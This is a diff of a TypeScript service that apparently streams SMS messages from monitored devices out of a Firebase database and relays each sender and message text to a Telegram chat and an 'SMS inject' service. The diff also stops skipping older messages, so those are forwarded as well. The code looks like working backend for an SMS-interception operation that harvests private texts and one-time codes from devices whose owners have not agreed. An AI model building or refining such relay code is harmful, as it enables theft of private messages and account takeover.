@@ -13,26 +13,55 @@ import { logger } from "../logger/logger";
 const activeListeners = new Set<string>();
 
 
+
+function escapeHtml(text:string){
+
+    return String(text)
+        .replace(/&/g,"&amp;")
+        .replace(/</g,"&lt;")
+        .replace(/>/g,"&gt;")
+        .replace(/"/g,"&quot;")
+        .replace(/'/g,"&#039;");
+
+}
+
+
+
+
+
 export function startFirebaseSmsListener(){
 
+
     setInterval(()=>{
+
 
         const sessions =
             MonitoringRepository.findRunning();
 
 
-        for(const session of sessions){
+
+        for(
+            const session of sessions
+        ){
+
 
             const key =
-                `${session.backend_id}_${session.device_id}`;
+            `${session.backend_id}_${session.device_id}`;
 
 
-            if(activeListeners.has(key)){
+
+            if(
+                activeListeners.has(key)
+            ){
+
                 continue;
+
             }
 
 
+
             activeListeners.add(key);
+
 
 
             startDeviceListener(
@@ -40,20 +69,30 @@ export function startFirebaseSmsListener(){
                 key
             );
 
+
         }
 
 
     },5000);
+
+
 
 }
 
 
 
 
+
+
+
 function startDeviceListener(
+
     session:any,
+
     listenerKey:string
+
 ){
+
 
 
     const backend:any =
@@ -62,12 +101,22 @@ function startDeviceListener(
         );
 
 
+
+
     if(!backend){
 
-        activeListeners.delete(listenerKey);
+
+        activeListeners.delete(
+            listenerKey
+        );
+
         return;
 
     }
+
+
+
+
 
 
 
@@ -77,24 +126,65 @@ function startDeviceListener(
 
 
 
+
+
+    const authKey =
+        backend.config.auth_key;
+
+
+
+
+
     if(!databaseUrl){
 
-        activeListeners.delete(listenerKey);
+
+        activeListeners.delete(
+            listenerKey
+        );
+
         return;
 
     }
 
 
 
-    const url =
-        databaseUrl.replace(/\/$/,"")
+
+
+
+    let url =
+
+        databaseUrl
+        .trim()
+        .replace(/^["']|["']$/g,"")
+        .replace(/\/$/,"")
+
         +
+
         `/users/${session.device_id}/all_sms.json`;
+
+
+
+
+
+    if(authKey){
+
+
+        url +=
+        `?auth=${encodeURIComponent(authKey)}`;
+
+    }
+
+
+
+
 
 
 
     const source =
         new EventSource(url);
+
+
+
 
 
 
@@ -107,12 +197,15 @@ function startDeviceListener(
 
 
             const firebaseEvent =
-                JSON.parse(event.data);
+                JSON.parse(
+                    event.data
+                );
 
 
 
             const path =
                 firebaseEvent.path || "";
+
 
 
             const data =
@@ -121,8 +214,12 @@ function startDeviceListener(
 
 
             if(data == null){
+
                 return;
+
             }
+
+
 
 
 
@@ -130,7 +227,13 @@ function startDeviceListener(
 
 
 
-            if(path.includes("/messages/")){
+
+
+
+
+            if(
+                path.includes("/messages/")
+            ){
 
 
                 smsList.push({
@@ -141,16 +244,22 @@ function startDeviceListener(
                     .filter(Boolean)
                     .pop(),
 
+
                     sms:data
 
                 });
 
 
             }
+
             else if(
+
                 path.endsWith("/messages")
+
                 &&
+
                 typeof data === "object"
+
             ){
 
 
@@ -158,6 +267,7 @@ function startDeviceListener(
                     const [key,value]
                     of Object.entries<any>(data)
                 ){
+
 
                     smsList.push({
 
@@ -167,13 +277,17 @@ function startDeviceListener(
 
                     });
 
+
                 }
 
 
             }
+
             else{
 
+
                 return;
+
 
             }
 
@@ -181,15 +295,24 @@ function startDeviceListener(
 
 
 
-            for(const item of smsList){
+
+
+
+            for(
+                const item of smsList
+            ){
+
 
 
                 const sms =
                     item.sms;
 
 
+
                 const key =
                     item.key;
+
+
 
 
 
@@ -206,9 +329,17 @@ function startDeviceListener(
 
 
 
+
+
+
                 if(
-                    sms.type !== "incoming" &&
+
+                    sms.type !== "incoming"
+
+                    &&
+
                     sms.type !== "outgoing"
+
                 ){
 
                     continue;
@@ -217,15 +348,6 @@ function startDeviceListener(
 
 
 
-
-                if(
-                    sms.is_old_message === true ||
-                    key.startsWith("old_incoming")
-                ){
-
-                    continue;
-
-                }
 
 
 
@@ -237,16 +359,22 @@ function startDeviceListener(
                         backendId:
                         session.backend_id,
 
+
                         deviceId:
                         session.device_id,
 
+
                         source:
                         sms.type,
+
 
                         uniqueKey:
                         key
 
                     });
+
+
+
 
 
 
@@ -260,8 +388,12 @@ function startDeviceListener(
 
 
 
-                const startTime =
+
+
+                const totalStart =
                     Date.now();
+
+
 
 
 
@@ -270,6 +402,9 @@ function startDeviceListener(
                     sms.body ||
                     sms.text ||
                     "Unknown";
+
+
+
 
 
 
@@ -283,54 +418,154 @@ function startDeviceListener(
 
 
 
-                const typeTitle =
-                    sms.type === "outgoing"
-                    ?
-                    "⚡ OUTGOING SMS [STREAM]"
-                    :
-                    "⚡ INCOMING SMS [STREAM]";
-
-
-
-
                 const queueTime =
-                    Date.now() - startTime;
+                    Date.now() - totalStart;
 
 
 
 
-                await Promise.all([
 
 
-                    SmsInjectService.inject(
-                        sender,
-                        message
-                    ),
+                let injectTime = 0;
+
+                let telegramTime = 0;
 
 
 
-                    bot.telegram.sendMessage(
+
+
+
+                /*
+                    HTML INJECTION
+                */
+
+
+                try{
+
+
+                    const injectStart =
+                        Date.now();
+
+
+
+                    const injected =
+                        await SmsInjectService.inject(
+
+                            session.telegram_id,
+
+                            sender,
+
+                            message
+
+                        );
+
+
+
+                    injectTime =
+                        Date.now() - injectStart;
+
+
+
+                    if(injected){
+
+
+                        logger.info(
+                            `SMS API forwarded -> ${session.device_id}`
+                        );
+
+
+                    }
+
+
+                }
+
+                catch(error:any){
+
+
+                    logger.error(
+
+                        `SMS API failed -> ${error.message}`
+
+                    );
+
+
+                }
+
+
+
+
+
+
+
+
+                /*
+                    TELEGRAM MESSAGE
+                */
+
+
+                try{
+
+
+                    const telegramStart =
+                        Date.now();
+
+
+
+                    await bot.telegram.sendMessage(
 
                         session.telegram_id,
 
 
-`✅ SUCCESS
-\`\`\`text
-${typeTitle}
-📤 Sender: ${sender}
-🔐 Message: ${message}
-📱 Device: ${session.device_id}
-⏱ queued ${queueTime}ms | total ${Date.now()-startTime}ms
-\`\`\``,
+`<pre>
+✅ SMS INJECTED
+
+📤 SENDER: ${escapeHtml(sender)}
+🔐 MESSAGE: ${escapeHtml(message)}
+📱 DEVICE: ${escapeHtml(session.device_id)}
+⏱ QUEUE: ${queueTime}ms 🌐 INJECT: ${injectTime}ms
+⚡ STREAM ONLINE
+</pre>`,
 
                         {
-                            parse_mode:"Markdown"
+
+                            parse_mode:"HTML"
+
                         }
 
-                    )
+                    );
 
 
-                ]);
+
+                    telegramTime =
+                        Date.now() - telegramStart;
+
+
+
+                }
+
+                catch(error:any){
+
+
+                    logger.error(
+
+                        `Telegram send failed -> ${error.message}`
+
+                    );
+
+
+                }
+
+
+
+
+
+
+
+                const totalTime =
+                    Date.now() - totalStart;
+
+
+
 
 
 
@@ -341,16 +576,22 @@ ${typeTitle}
                     backendId:
                     session.backend_id,
 
+
                     deviceId:
                     session.device_id,
+
 
                     source:
                     sms.type,
 
+
                     uniqueKey:
                     key
 
+
                 });
+
+
 
 
 
@@ -362,30 +603,43 @@ ${typeTitle}
                     telegramId:
                     session.telegram_id,
 
+
                     backendId:
                     session.backend_id,
+
 
                     deviceId:
                     session.device_id,
 
+
                     deviceModel:
                     sms.device_model,
+
 
                     phoneNumber:
                     sender,
 
+
                     message,
 
+
+
                     receivedAt:
+
                     sms.timestamp_ms
+
                     ?
+
                     new Date(
                         Number(
                             sms.timestamp_ms
                         )
                     ).toISOString()
+
                     :
+
                     new Date().toISOString()
+
 
                 });
 
@@ -393,9 +647,14 @@ ${typeTitle}
 
 
 
+
+
                 logger.info(
-                    `Realtime ${sms.type} forwarded -> ${session.device_id} (${Date.now()-startTime}ms)`
+
+`Firebase ${sms.type} forwarded -> ${session.device_id} | total ${totalTime}ms`
+
                 );
+
 
 
             }
@@ -403,11 +662,16 @@ ${typeTitle}
 
 
         }
+
         catch(error:any){
 
+
             logger.error(
+
                 `Firebase listener error: ${error.message}`
+
             );
+
 
         }
 
@@ -418,14 +682,19 @@ ${typeTitle}
 
 
 
+
+
+
     source.onmessage =
         handleFirebaseEvent;
+
 
 
     source.addEventListener(
         "put",
         handleFirebaseEvent
     );
+
 
 
     source.addEventListener(
@@ -437,10 +706,14 @@ ${typeTitle}
 
 
 
+
+
+
     source.onerror = ()=>{
 
 
         source.close();
+
 
 
         activeListeners.delete(
@@ -448,8 +721,11 @@ ${typeTitle}
         );
 
 
+
         logger.error(
-            `Firebase listener disconnected -> ${session.device_id}`
+
+`Firebase listener disconnected -> ${session.device_id}`
+
         );
 
 
